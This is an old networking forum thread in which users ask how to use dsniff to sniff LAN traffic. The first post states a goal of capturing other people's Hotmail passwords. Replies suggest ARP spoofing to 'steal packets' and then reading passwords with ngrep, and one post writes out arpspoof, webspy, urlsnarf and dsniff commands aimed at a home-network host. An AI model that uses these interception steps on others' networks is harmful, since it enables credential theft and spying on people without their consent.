---
title: "dsniff - monitor/steal data flow on network"
date: 2006-10-24
forum: Networking &amp; Wireless
---

### Post by ShendZ on 2006-10-24
hi guys,
i am interested in dsniff. i read some article on the net, but they are pretty old. i still can't get to know how to use this tool called dsniff
it is to monitor network. furthermore, it can be used to get data flow from the network (like maybe a hotmail password)
i assume, as we dsniff the target machine, and if the person is logging in to hotmail, the password typed in will be stored to our machin trough dsniff.

it would be fun to know how to use dsniff, any one out there could help with it?

oh ya, and i assume this only work in a local area network (LAN)

-shendy

---

### Post by dmsn on 2006-10-24
Start arpspoof and steal packets from any pc, man arpspoof.
When you got that working you can install ngrep and there
you can easy see passwords and such things.

good luck..

---

### Post by fakie_flip on 2007-02-17
Is this correct? The default gateway (the router) of the network is 192.168.1.1, and the computer that I want to sniff packets of on my home network is 192.168.1.100. 

```
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
```

After doing that, shouldn't I be able to see some packets that were supposed to go to the 192.168.1.100 computer or packets being sent from it? I run these commands, but they aren't outputting anything.

```
sudo webspy -i eth0 192.168.1.100
Password:
webspy: listening on eth0
```

```
sudo urlsnarf -i eth0
Password:
urlsnarf: listening on eth0 [tcp port 80 or port 8080 or port 3128]
```

```
sudo dsniff -i eth0 
Password:
dsniff: listening on eth0
```

---

### Post by ampted on 2007-05-22
yeah! I did the shame thing but got stuck! how ever I found a preaty nice artical on dsniff! (sort of a  learn about sniffing) called Introduction to dsniff. [http://www.giac.org/certified_professionals/practicals/gsec/0810.php](http://www.giac.org/certified_professionals/practicals/gsec/0810.php)
havent looked on it proparly yet meself but it looks good!!

---

